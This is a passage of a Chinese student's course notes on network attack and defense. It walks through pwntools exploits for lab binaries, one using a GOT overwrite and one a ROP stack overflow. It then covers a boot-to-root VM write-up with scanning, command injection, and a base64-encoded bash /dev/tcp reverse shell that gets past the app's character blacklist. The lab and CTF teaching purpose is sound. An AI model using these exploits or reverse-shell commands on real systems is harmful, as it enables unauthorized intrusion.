*\n\n# --- \u73af\u5883\u914d\u7f6e ---\n# \u5728\u672c\u5730\u8c03\u8bd5\u65f6:\n# p = process(\"./chall3\")\n# libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") # \u4f7f\u7528\u4f60\u672c\u5730\u7684libc\n# \u8fdc\u7a0b\u5229\u7528\u65f6:\np = remote(\"localhost\", 9003)\nlibc = ELF(\"./libc.so.6\") # \u4f7f\u7528\u9898\u76ee\u63d0\u4f9b\u7684libc\n\ne = ELF(\"./chall3\")\n\n# --- \u6b65\u9aa4 1: \u6cc4\u9732 puts \u51fd\u6570\u5728\u5185\u5b58\u4e2d\u7684\u771f\u5b9e\u5730\u5740 ---\n# \u8ba1\u7b97 notes \u6570\u7ec4\u5230 puts@got \u7684\u504f\u79fb\noffset_to_puts_got = (e.got['puts'] - e.symbols['notes']) // 8 # __TODO__\nlog.info(f\"Offset from notes array to puts@got: {offset_to_puts_got}\")\n\n# \u4f7f\u7528 \"Read a note\" \u529f\u80fd\u8bfb\u53d6 puts@got \u7684\u5185\u5bb9\np.sendlineafter(b\"&gt;&gt; \", b\"1\")\np.sendlineafter(b\"Index: \", str(offset_to_puts_got).encode())\n\n# \u89e3\u6790\u8f93\u51fa\uff0c\u83b7\u53d6\u5730\u5740\np.recvuntil(b\" = \")\nleaked_puts_addr = int(p.recvline().strip())\nlog.success(f\"Leaked puts() address: {hex(leaked_puts_addr)}\")\n\n# --- \u6b65\u9aa4 2: \u8ba1\u7b97 system \u548c \"/bin/sh\" \u7684\u5730\u5740 ---\n# \u8ba1\u7b97 libc \u5728\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\nlibc_base = leaked_puts_addr - libc.sym['puts'] # __TODO__\nlog.info(f\"Calculated libc base address: {hex(libc_base)}\")\n\n# \u8ba1\u7b97 system \u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740\nsystem_addr = libc_base + libc.sym['system'] # __TODO__\nlog.success(f\"Calculated system() address: {hex(system_addr)}\")\n\n# \u6ce8\u610f\uff1a\u56e0\u4e3a\u8981\u6267\u884c system(\"sh\")\uff0c\u4f46 secret_func() \u53ea\u63d0\u4f9b\u4e86 \"sh\"\uff0c\n# \u6211\u4eec\u53ef\u4ee5\u52ab\u6301 puts@got \u5230 system\uff0c\u7136\u540e\u89e6\u53d1 puts(\"sh\")\u3002\n\n# --- \u6b65\u9aa4 3: \u52ab\u6301 puts@got \u4e3a system \u7684\u5730\u5740 ---\np.sendlineafter(b\"&gt;&gt; \", b\"2\")\np.sendlineafter(b\"Index: \", str(offset_to_puts_got).encode())\np.sendlineafter(b\"Value: \", str(system_addr).encode())\nlog.info(\"Overwrote puts@got with system address.\")\n\n# --- \u6b65\u9aa4 4: \u89e6\u53d1 payload ---\n# \u8c03\u7528 secret_func()\uff0c\u5b83\u4f1a\u6267\u884c puts(\"sh\")\n# \u7531\u4e8e GOT \u88ab\u52ab\u6301\uff0c\u5b9e\u9645\u6267\u884c\u7684\u662f system(\"sh\")\np.sendlineafter(b\"&gt;&gt; \", b\"4\")\n\np.interactive()\n</code></pre> <p>\u4e0b\u9762\u9010\u4e2a\u73af\u8282\u4e00\u4e00\u8bb2\u89e3</p> <pre><code>from pwn import *\n</code></pre> <p>Part 1 \u5c06 pwn \u5e93\u5bfc\u5165\u3002</p> <pre><code># --- \u73af\u5883\u914d\u7f6e ---\n# \u5728\u672c\u5730\u8c03\u8bd5\u65f6:\n# p = process(\"./chall3\")\n# libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") # \u4f7f\u7528\u4f60\u672c\u5730\u7684libc\n# \u8fdc\u7a0b\u5229\u7528\u65f6:\np = remote(\"localhost\", 9003)\nlibc = ELF(\"./libc.so.6\") # \u4f7f\u7528\u9898\u76ee\u63d0\u4f9b\u7684libc\n\ne = ELF(\"./chall3\")\n</code></pre> <p>Part 2 \u5efa\u7acb TCP \u8fde\u63a5\u5f97\u5230\u4e00\u4e2a tube \u5bf9\u8c61 <code>p</code> \u7528\u4e8e\u4ea4\u4e92\u3002\u5c06\u9898\u76ee\u63d0\u4f9b\u7684 <code>libc</code> \u6587\u4ef6\u52a0\u8f7d\u4e3a ELF \u5bf9\u8c61\uff0c\u4fbf\u4e8e\u4e4b\u540e\u8bfb\u53d6\u7b26\u53f7\u5730\u5740/\u504f\u79fb\u3002\u6ce8\u610f\u4e0d\u540c libc \u7248\u672c\u4e2d\u51fd\u6570 offset \u4e0d\u540c\uff0c\u9519\u8bef\u7684 libc \u4f1a\u5bfc\u81f4\u8ba1\u7b97\u51fa\u7684\u5730\u5740\u4e0d\u5bf9\u3002\u53e6\u5916\u52a0\u8f7d\u76ee\u6807\u4e8c\u8fdb\u5236 chall3 \u4e3a ELF \u5bf9\u8c61 e\uff0c\u4ee5\u4fbf\u7684\u8bfb\u53d6\u5176\u7b26\u53f7\u8868\u3001GOT/PLT\u3001\u8282\u533a\u5730\u5740\u7b49\u3002</p> <pre><code># --- \u6b65\u9aa4 1: \u6cc4\u9732 puts \u51fd\u6570\u5728\u5185\u5b58\u4e2d\u7684\u771f\u5b9e\u5730\u5740 ---\n# \u8ba1\u7b97 notes \u6570\u7ec4\u5230 puts@got \u7684\u504f\u79fb\noffset_to_puts_got = (e.got['puts'] - e.symbols['notes']) // 8 # __TODO__\nlog.info(f\"Offset from notes array to puts@got: {offset_to_puts_got}\")\n\n# \u4f7f\u7528 \"Read a note\" \u529f\u80fd\u8bfb\u53d6 puts@got \u7684\u5185\u5bb9\np.sendlineafter(b\"&gt;&gt; \", b\"1\")\np.sendlineafter(b\"Index: \", str(offset_to_puts_got).encode())\n\n# \u89e3\u6790\u8f93\u51fa\uff0c\u83b7\u53d6\u5730\u5740\np.recvuntil(b\" = \")\nleaked_puts_addr = int(p.recvline().strip())\nlog.success(f\"Leaked puts() address: {hex(leaked_puts_addr)}\")\n</code></pre> <p>Part 3 \u9996\u5148\u4f7f\u7528 <code>e.got['puts']</code> \u6765\u83b7\u53d6 ELF \u4e2d puts \u5728 GOT\uff08\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u7684\u4f4d\u7f6e\uff0c\u4e14\u4e3a\u6587\u4ef6\u91cc\u7684\u5730\u5740\u800c\u975e\u8fdb\u7a0b\u8fd0\u884c\u65f6\u7684\u7edd\u5bf9 libc \u5730\u5740\uff09\uff0c\u7136\u540e\u51cf\u53bb\u4e8c\u8fdb\u5236\u4e2d\u540d\u4e3a <code>notes</code> \u7684\u7b26\u53f7\u5730\u5740\uff08\u4f7f\u7528 <code>e.symbols['notes']</code> \u83b7\u53d6\uff09\uff0c\u4e8c\u8005\u76f8\u51cf\u9664\u4ee5 <code>8</code> \u5f97\u5230\u7d22\u5f15\u3002\u6ce8\u610f\u6b64\u5904\u5047\u5b9a\u4e86 notes \u6570\u7ec4\u7684\u5355\u4e2a\u5143\u7d20\u5360\u636e 8 \u5b57\u8282\uff0864-bit \u6307\u9488\uff09\uff0c\u4e14 <code>puts@got</code> \u7684\u5185\u5bb9\u4f1a\u653e\u7f6e\u5728 notes \u6570\u7ec4\u4e2d\u3002</p> <p>\u63a5\u4e0b\u6765 <code>p.sendlineafter(b\"&gt;&gt; \", b\"1\")</code> \u662f\u7b49\u5f85\u8fdc\u7aef\u8f93\u51fa\u5305\u542b <code>\"&gt;&gt; \"</code> \u7684\u63d0\u793a\u540e\u53d1\u9001 <code>1\\n</code> .</p> <p>\u7c7b\u4f3c\u5730 <code>p.sendlineafter(b\"Index: \", str(offset_to_puts_got).encode())</code> \u7b49\u5f85 <code>Index:</code>  \u540e\u5c06\u8ba1\u7b97\u597d\u7684\u7d22\u5f15\u5b57\u7b26\u53d1\u9001\u7ed9\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u5c06\u7528\u6b64\u7d22\u5f15\u8bfb\u53d6 <code>nodes[index]</code> \u5e76\u6253\u5370\uff0c\u56e0 index \u6307\u5411\u4e86 <code>puts@got</code>  \u6240\u5728\u69fd\u4f4d\uff0c\u6545\u800c\u7a0b\u5e8f\u4f1a\u6253\u5370 GOT \u4e2d\u7684\u503c\uff0c\u9020\u6210\u4fe1\u606f\u6cc4\u9732\u3002</p> <p>\u63a5\u4e0b\u6765 <code>p.recvuntil(b\" = \")</code> \u8fd9\u4e2a\u51fd\u6570\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u963b\u585e\u76f4\u5230\u7b49\u5230\u8f93\u51fa\u4e2d\u7684 <code>=</code> . <code>leaked_puts_addr = int(p.recvline.strip())</code> \u4ece\u968f\u540e\u7684\u4e00\u6574\u884c\u8bfb\u53d6\u5e76\u8f6c\u4e3a\u6574\u6570\uff08int \u7c7b\u578b\uff09\u3002</p> <pre><code># --- \u6b65\u9aa4 2: \u8ba1\u7b97 system \u548c \"/bin/sh\" \u7684\u5730\u5740 ---\n# \u8ba1\u7b97 libc \u5728\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\nlibc_base = leaked_puts_addr - libc.sym['puts'] # __TODO__\nlog.info(f\"Calculated libc base address: {hex(libc_base)}\")\n\n# \u8ba1\u7b97 system \u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740\nsystem_addr = libc_base + libc.sym['system'] # __TODO__\nlog.success(f\"Calculated system() address: {hex(system_addr)}\")\n\n# \u6ce8\u610f\uff1a\u56e0\u4e3a\u8981\u6267\u884c system(\"sh\")\uff0c\u4f46 secret_func() \u53ea\u63d0\u4f9b\u4e86 \"sh\"\uff0c\n# \u6211\u4eec\u53ef\u4ee5\u52ab\u6301 puts@got \u5230 system\uff0c\u7136\u540e\u89e6\u53d1 puts(\"sh\")\u3002\n</code></pre> <p>Part 4 <code>libc.sys['puts']</code> \u662f\u5728\u52a0\u8f7d\u7684 libc \u6587\u4ef6\u5185 puts \u7b26\u53f7\u7684\u6587\u4ef6\u5185\u504f\u79fb\uff08\u5728 libc \u4e2d\u7684\u76f8\u5bf9\u5730\u5740\uff09\uff0c<code>leaked_puts_addr</code> \u662f\u6211\u4eec\u4e4b\u524d\u6c42\u51fa\u7684\u8fdb\u7a0b\u4e2d puts \u7684\u5b9e\u9645\u4f4d\u7f6e\uff08\u5373\u8fd0\u884c\u65f6\u4f4d\u7f6e\uff09\uff0c\u4f4d\u7f6e\u51cf\u504f\u5dee\u5f97\u5230\u57fa\u5740 <code>libc_base</code>. \u4e8e\u6b64\u540c\u65f6\uff0c<code>libc.sym['system']</code> \u7c7b\u4f3c\uff0c\u662f libc \u6587\u4ef6\u5185 system \u7684\u504f\u79fb\uff0c\u57fa\u5740\u52a0\u504f\u79fb\u5f97\u5230 system \u7684\u8fd0\u884c\u65f6\u4f4d\u7f6e.</p> <pre><code># --- \u6b65\u9aa4 3: \u52ab\u6301 puts@got \u4e3a system \u7684\u5730\u5740 ---\np.sendlineafter(b\"&gt;&gt; \", b\"2\")\np.sendlineafter(b\"Index: \", str(offset_to_puts_got).encode())\np.sendlineafter(b\"Value: \", str(system_addr).encode())\nlog.info(\"Overwrote puts@got with system address.\")\n</code></pre> <p>Part 5 \u5728\u76ee\u6807\u7a0b\u5e8f\u4e2d\u4f1a\u5bf9\u67d0\u4e2a\u5b57\u7b26\u4e32 \u201csh\u201d \u505a <code>puts(\"sh\")</code> \uff0c\u6545\u800c\u5c06 <code>puts@got</code> \u8986\u76d6\u4e3a system \u7684\u5730\u5740\uff0c\u90a3\u4e48\u8be5\u8c03\u7528 puts \u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u4f1a\u6267\u884c <code>system(\"sh\")</code> \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u83b7\u5f97\u4e86 Shell\uff0c\u8fd9\u79cd\u6280\u5de7\u88ab\u79f0\u4f5c GOT \u52ab\u6301\uff08GOT overwrite\uff09.</p> <pre><code># --- \u6b65\u9aa4 4: \u89e6\u53d1 payload ---\n# \u8c03\u7528 secret_func()\uff0c\u5b83\u4f1a\u6267\u884c puts(\"sh\")\n# \u7531\u4e8e GOT \u88ab\u52ab\u6301\uff0c\u5b9e\u9645\u6267\u884c\u7684\u662f system(\"sh\")\np.sendlineafter(b\"&gt;&gt; \", b\"4\")\n\np.interactive()\n</code></pre> <p>Part 6 \u53d1\u9001\u4fe1\u606f\u5728\u83dc\u5355\u4e2d\u9009\u62e9\u9879 <code>4</code>\uff0c\u5047\u610f\u6267\u884c <code>puts</code> \u5b9e\u9645\u6267\u884c <code>system(\"sh\")</code> \u6253\u5f00 shell\uff0c\u63a5\u4e0b\u6765\u4f7f\u7528 <code>p.interactive()</code> \u5207\u6362\u5230\u4ea4\u4e92\u6a21\u5f0f\uff0c\u8054\u673a\u672c\u5730\u7ec8\u7aef\u548c\u8fdc\u7aef\u8fdb\u7a0b\uff0c\u8fbe\u6210\u7c7b\u4f3c\u53cd\u5f39 shell \u7684\u6548\u679c\u3002</p> <p>\u83b7\u53d6\u6743\u9650\u540e\u6211\u4eec\u901a\u8fc7 <code>ls</code> \u67e5\u770b\u76ee\u5f55\u4e0b\u6587\u4ef6\uff0c\u770b\u5230 flag \u6587\u4ef6\u540e\u76f4\u63a5\u6267\u884c <code>cat /flag</code> \u8f93\u51fa\u5176\u4e2d\u5185\u5bb9\u3002</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab7_pwn/#exp4","title":"exp4","text":"<pre><code>from pwn import *\n# p = process(\"./chall4\")\ncontext.arch='amd64'\np = remote(\"localhost\", 9004)\ne = ELF(\"./chall4\")\n\n# \u4f7f\u7528 pwntools.ROP \u6a21\u5757\nrop = ROP(e)\n\n# \u6808\u5bf9\u9f50\uff0chttps://github.com/Gallopsled/pwntools/issues/1870\nrop.call(rop.ret)\n\n# \u76ee\u6807: call gadget_func('s', 'h', 0)\n# pwntools \u4f1a\u81ea\u52a8\u5bfb\u627e pop rdi/rsi/rdx \u7b49gadgets\u6765\u8bbe\u7f6e\u53c2\u6570\n# https://docs.pwntools.com/en/stable/rop/rop.html#pwnlib.rop.rop.ROP.call\n\nrop.call(e.sym['gadget_func'],(ord('s'),ord('h'),0)) #__TODO__\n\nlog.info(\"Constructed ROP chain:\\n\" + rop.dump())\n\n# 32\u5b57\u8282\u7f13\u51b2\u533a + ?\npayload = b'A' * 40 + rop.chain() #__TODO__\n\n# pause()\n\np.sendlineafter(b\"payload: \", payload)\np.interactive()\n</code></pre> <pre><code>from pwn import *\n# p = process(\"./chall4\")\ncontext.arch='amd64'\np = remote(\"localhost\", 9004)\ne = ELF(\"./chall4\")\n</code></pre> <p>Part 1 \u5c06 pwn \u5e93\u5bfc\u5165\uff0c\u6307\u660e\u67b6\u6784\u4e3a amd64\uff0c\u8fdc\u7a0b\u8fde\u63a5\uff0c\u8bfb\u5165 chall4 \u7684\u7b26\u53f7\u8868\u3001GOT \u7b49\u3002</p> <pre><code># \u4f7f\u7528 pwntools.ROP \u6a21\u5757\nrop = ROP(e)\n\n# \u6808\u5bf9\u9f50\uff0chttps://github.com/Gallopsled/pwntools/issues/1870\nrop.call(rop.ret)\n\n# \u76ee\u6807: call gadget_func('s', 'h', 0)\n# pwntools \u4f1a\u81ea\u52a8\u5bfb\u627e pop rdi/rsi/rdx \u7b49gadgets\u6765\u8bbe\u7f6e\u53c2\u6570\n# https://docs.pwntools.com/en/stable/rop/rop.html#pwnlib.rop.rop.ROP.call\n\nrop.call(e.sym['gadget_func'],(ord('s'),ord('h'),0)) #__TODO__\n\nlog.info(\"Constructed ROP chain:\\n\" + rop.dump())\n</code></pre> <p>Part 2 <code>rop = ROP(e)</code> \u8c03\u7528 pwntools \u7684 ROP \u5de5\u5177\uff0c\u7528\u4e8e\u81ea\u52a8\u5206\u6790 ELF\uff0c\u81ea\u52a8\u641c\u5bfb gadget\uff0c\u81ea\u52a8\u6784\u9020 ROP chain. <code>rop.call(rop.ret)</code> \u6808\u5bf9\u9f50\uff0c\u8fd9\u662f\u56e0\u4e3a glibc \u5728\u6267\u884c\u51fd\u6570\uff08\u5305\u62ec system\u3001printf\uff09 \u65f6\u8981\u6c42\u6808\u5341\u516d\u5b57\u8282\u5bf9\u9f50\uff08stack 16-byte aligned\uff09\uff0c\u5426\u5219\u53ef\u80fd\u5d29\u6e83\u3002\u6b64\u5904\u4ec5\u52a0\u5165\u4e00\u4e2a <code>ret</code> gadget \u4f7f\u5f97 rsp \u5bc4\u5b58\u5668\u52a0 8\uff0c\u4ece\u800c\u5341\u516d\u5b57\u8282\u5bf9\u9f50\u3002</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u8981\u5229\u7528\u6808\u6ea2\u51fa\u3002<code>rop.call(e.sym['gadget_func'],(ord('s'),ord('h'),0))</code> \u5c06 <code>'s'</code>\u3001<code>'h'</code>\u3001<code>'\\0'</code> \u585e\u5165\u5bc4\u5b58\u5668\u4e2d\uff0c\u5176\u4e32\u51fa\u7684\u6307\u4ee4 <code>system(\"sh\")</code> \u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u4ece\u800c\u83b7\u53d6 shell \u6743\u9650\u3002\u6b64\u5904\u5b57\u7b26 <code>'s'</code> \u4e0e<code>'h'</code> \u901a\u8fc7 <code>ord()</code> \u5f3a\u884c\u8f6c\u5316\u4e3a char \u7c7b\u578b\u3002</p> <pre><code># 32\u5b57\u8282\u7f13\u51b2\u533a + ?\npayload = b'A' * 40 + rop.chain() #__TODO__\n\n# pause()\n\np.sendlineafter(b\"payload: \", payload)\np.interactive()\n</code></pre> <p>Part 3 \u6211\u4eec\u5c31\u8981\u8ba9\u8fd9\u4e2a\u6808\u6ea2\u51fa\uff0c\u8bbe\u7f6e payload\uff0c\u4ece\u6808\u5e27\u6765\u770b\uff0c\u5b83\u4e0d\u4ec5\u5e94\u5360\u6389\u7f13\u51b2\u533a\u7684 32 \u4e2a\u5b57\u8282\uff0c\u8fd8\u8981\u5360\u6389 rbp \u7684 8 \u4e2a\u5b57\u8282\uff0c\u63a5\u4e0b\u6765\u5c31\u8981\u8d8a\u754c\u5230 rip \u7684 8 \u4e2a\u5b57\u8282\u4e86\uff0c\u8fd9\u4e2a\u65f6\u5019 <code>ret</code> \u5c31\u662f <code>pop RIP</code> \uff0c\u9010\u6b65\u5c06\u6211\u4eec\u4e4b\u524d\u8bbe\u7f6e\u7684 <code>'s'</code>\u3001<code>'h'</code>\u3001<code>'\\0'</code> \u5f39\u51fa\u6765\u3002</p> <p>\u63a5\u4e0b\u6765 <code>sendlineafter</code> \u5f00\u59cb\u6267\u884c\u51fd\u6570\uff0c\u5e76\u901a\u8fc7\u6808\u6ea2\u51fa\u5b9e\u9645\u6267\u884c\u4e86 <code>system(\"sh\")</code> \uff0c\u4e8e\u662f\u63a5\u4e0b\u6765\u4f7f\u7528 <code>p.interactive()</code> \u5207\u6362\u5230\u4ea4\u4e92\u6a21\u5f0f\u3002\u63a5\u4e0b\u6765\u540c exp3 \u83b7\u53d6 flag.</p> <p>\u83b7\u53d6\u6743\u9650\u540e\u6211\u4eec\u901a\u8fc7 <code>ls</code> \u67e5\u770b\u76ee\u5f55\u4e0b\u6587\u4ef6\uff0c\u770b\u5230 flag \u6587\u4ef6\u540e\u76f4\u63a5\u6267\u884c <code>cat /flag</code> \u8f93\u51fa\u5176\u4e2d\u5185\u5bb9\u3002</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab8/","title":"Lab8","text":"<p>Network Atk&amp;Def lab7 241840273 \u6768\u826f\u707c</p> <p>\u67e5\u8be2\u653b\u51fb\u673a ip</p> <pre><code>\u2514\u2500$ ifconfig\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255\n        inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 08:00:27:3c:97:80  txqueuelen 1000  (Ethernet)\n        RX packets 1  bytes 590 (590.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 25  bytes 3214 (3.1 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 8  bytes 480 (480.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8  bytes 480 (480.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <p>\u4e3b\u673a\u53d1\u73b0</p> <pre><code>\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 08:00:27:3c:97:80, IPv4: 10.0.2.4\nWARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied\nWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n10.0.2.1        52:54:00:12:35:00       (Unknown: locally administered)\n10.0.2.2        52:54:00:12:35:00       (Unknown: locally administered)\n10.0.2.3        08:00:27:3d:19:c5       (Unknown)\n10.0.2.10       08:00:27:12:0c:64       (Unknown)\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.919 seconds (133.40 hosts/sec). 4 responded\n</code></pre> <p>\u7aef\u53e3\u626b\u63cf</p> <pre><code>\u2514\u2500$ sudo nmap -p- 10.0.2.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 00:07 EST\nNmap scan report for 10.0.2.10\nHost is up (0.00013s latency).                                                                                                                             \nNot shown: 65531 closed tcp ports (reset)                                                                                                                  \nPORT     STATE    SERVICE                                                                                                                                  \n21/tcp   open     ftp\n22/tcp   filtered ssh\n1337/tcp open     waste\n7331/tcp open     swx\nMAC Address: 08:00:27:12:0C:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 2.50 seconds\n</code></pre> <p>\u5c1d\u8bd5\u7528\u6d4f\u89c8\u5668\u8bbf\u95ee\u5404\u7aef\u53e3\uff0c\u53ea\u6709 7331 \u7aef\u53e3\u6709\u4e2a\u754c\u9762</p> <p></p> <p>\u4f7f\u7528 dirsearch \u6216 dirb \u626b\u63cf\u4ec0\u4e48\u90fd\u6ca1\u626b\u51fa\u6765\uff0c\u6211\u4eec\u4f7f\u7528\u4e00\u4e2a\u66f4\u5927\u7684\u5b57\u5178\u53bb\u626b\u63cf\uff1a</p> <pre><code>\u2514\u2500$ cd /usr/share/wordlists\n\u2514\u2500$ ls\n\u2514\u2500$ sudo apt install seclists\n</code></pre> <p>\u6211\u4eec\u5b89\u88c5 seclists\uff0c\u5e76\u4f7f\u7528\u5176\u4e2d\u7684\u5b57\u5178\u53bb\u626b\u63cf\uff1a</p> <pre><code>\u2514\u2500$ dirsearch -u http://10.0.2.10:7331 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           \n (_||| _) (/_(_|| (_| )                                                                                                                                    \n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545\n\nOutput File: /home/kali/reports/http_10.0.2.10_7331/_25-11-30_00-37-41.txt\n\nTarget: http://10.0.2.10:7331/\n\n[00:37:41] Starting:                                                                                                                                       \n[00:38:29] 200 -  385B  - /wish                                             \n[00:39:45] 200 -    2KB - /genie                                            \n\nTask Completed    \n</code></pre> <p>\u641c\u5230\u4e86\u4e24\u4e2a\u76ee\u5f55\uff0c\u6d4f\u89c8\u5668\u5c1d\u8bd5\u6253\u5f00 <code>http://10.0.2.10:7331/wish</code> \u548c <code>http://10.0.2.10:7331/genie</code>.</p> <p></p> <p></p> <p>\u6839\u636e wish \u9875\u9762\u7684\u63d0\u793a\uff0c\u6211\u4eec\u8f93\u5165\u968f\u4fbf\u4ec0\u4e48\u6307\u4ee4\uff0c\u53d1\u73b0\u90fd\u4f1a\u8df3\u8f6c\u5230 genie \u9875\u9762\uff0c\u4f46\u662f\u5bfc\u822a\u680f\u7ed9\u51fa\u7684\u4fe1\u606f\u4e0d\u540c\uff1a</p> <pre><code>&gt; whoami\n&lt; http://10.0.2.10:7331/genie?name=www-data%0A\n&gt; pwd\n&lt; http://10.0.2.10:7331/genie?name=%2Fopt%2F80%0A\n&gt; id\n&lt; http://10.0.2.10:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A\n&gt; whereis bash\n&lt; http://10.0.2.10:7331/genie?name=bash%3A+%2Fbin%2Fbash+%2Fetc%2Fbash.bashrc+%2Fusr%2Fshare%2Fman%2Fman1%2Fbash.1.gz%0A\n&gt; cat /etc/passwd\n&lt; http://10.0.2.10:7331/genie?name=Wrong+choice+of+words\n</code></pre> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u8f93\u5165\u4e00\u4e9b\u5176\u4ed6\u547d\u4ee4\uff0c\u6211\u4eec\u53d1\u73b0\u5927\u591a\u547d\u4ee4\u90fd\u4f1a\u8fd4\u56de\u4e00\u4e9b\u4e1c\u897f\uff0c\u4f46\u662f\u6709\u4e9b\u547d\u4ee4\u5219\u8fd4\u56de Wrong choice of words. \u5982\u679c\u6211\u4eec\u76f4\u63a5\u5c1d\u8bd5\u4f7f\u7528\u53cd\u5f39 shell\uff0c\u4e5f\u4f1a\u8fd4\u56de\u8fd9\u4e2a\uff0c\u8fd9\u8868\u660e\u547d\u4ee4\u5f88\u53ef\u80fd\u5b58\u5728\u9ed1\u540d\u5355\u8fc7\u6ee4\u673a\u5236\uff0c\u5e76\u4e14\u963b\u6b62\u6211\u4eec\u5229\u7528\u53cd\u5f39 shell \u5957\u53d6\u6743\u9650\u3002</p> <p>\u6211\u4eec\u91c7\u7528\u53ef\u9006\u7684 base64 \u52a0\u5bc6\u7ed5\u8fc7\u660e\u6587\u8fc7\u6ee4\uff0c\u4e4b\u540e\u518d\u89e3\u7801\u6267\u884c\uff1a\u5148\u76d1\u542c\u6bd4\u5982 3343 \u7aef\u53e3\uff1a</p> <pre><code>\u2514\u2500$ nc -nlvp 3343\nlistening on [any] 3343 ...\n</code></pre> <p>\u5c06\u53cd\u5f39 shell \u547d\u4ee4\u52a0\u5bc6\uff08\u8fd9\u4e2a\u53ef\u4ee5\u4f7f\u7528 burp suite \u7684 decoder \u754c\u9762\u5b8c\u6210\uff09\uff1a</p> <pre><code>&gt; bash -i &gt;&amp; /dev/tcp/10.0.2.4/3343 0&gt;&amp;1\n&lt; YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNC8zMzQzIDA+JjE=\n</code></pre> <p>\u5229\u7528\u7ba1\u9053\u7b26\u641e\u51fa\u8fd9\u4e2a\u6307\u4ee4\uff1a</p> <pre><code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuNC8zMzQzIDA+JjE= | base64 -d | bash\n</code></pre> <p>\u53cd\u5f39 shell \u6210\u529f\uff1a</p> <p></p> <p>\u770b\u4e0b\u6709\u4ec0\u4e48\uff1a</p> <pre><code>www-data@box7:/opt/80$ ls -l      \nls -l\ntotal 16\n-rw-r--r-- 1 www-data www-data 1323 Nov 13  2019 app.py\n-rw-r--r-- 1 www-data www-data 1846 Nov 14  2019 app.pyc\ndrwxr-xr-x 5 www-data www-data 4096 Nov 13  2019 static\ndrwxr-xr-x 2 www-data www-data 4096 Nov 14  2019 templates\n</code></pre> <p>\u7136\u540e\u6211\u4eec <code>cat app.py</code> \u770b\u4e00\u770b</p> <pre><code>import subprocess\n\nfrom flask import Flask, redirect, render_template, request, url_for\n\napp = Flask(__name__)\napp.secret_key = \"key\"\n\nCREDS = \"/home/nitish/.dev/creds.txt\"\n\nRCE = [\"/\", \".\", \"?\", \"*\", \"^\", \"$\", \"eval\", \";\"]\n\n\ndef validate(cmd):\n    if CREDS in cmd and \"cat\" not in cmd:\n        return True\n\n    try:\n        for i in RCE:\n            for j in cmd:\n                if i == j:\n                    return False\n        return True\n    except Exception:\n        return False\n\n\n@app.route(\"/\", methods=[\"GET\"])\ndef index():\n    return render_template(\"main.html\")\n\n\n@app.route(\"/wish\", methods=['POST', \"GET\"])\ndef wish():\n    execute = request.form.get(\"cmd\")\n    if execute:\n        if validate(execute):\n            output = subprocess.Popen(execute, shell=True,\n                                      stdout=subprocess.PIPE).stdout.read()\n        else:\n            output = \"Wrong choice of words\"\n\n        return redirect(url_for(\"genie\", name=output))\n    else:\n        return render_template('wish.html')\n\n\n@app.route('/genie', methods=['GET', 'POST'])\ndef genie():\n    if 'name' in request.args:\n        page = request.args.get('name')\n    else:\n        page = \"It's not that hard\"\n\n    return render_template('genie.html', file=page)\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', debug=True)\n</code></pre> <p>\u6211\u4eec\u770b\u5230\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u6709 <code>CREDS</code> \u4fe1\u606f\uff0c\u662f\u4e2a\u76ee\u5f55\uff0c\u6709\u4e2a <code>RCE</code> \u5217\u8868\u548c <code>validate()</code> \u51fd\u6570\uff0c\u8fd8\u6709\u4e2a <code>wish()</code> \u51fd\u6570\uff0c\u5176\u4e2d\u6709 <code>Wrong choice of words</code>\uff0c\u8868\u660e\u8fd9\u5c31\u662f wish \u9875\u9762\u7684\u540e\u7aef\u4ee3\u7801\u3002</p> 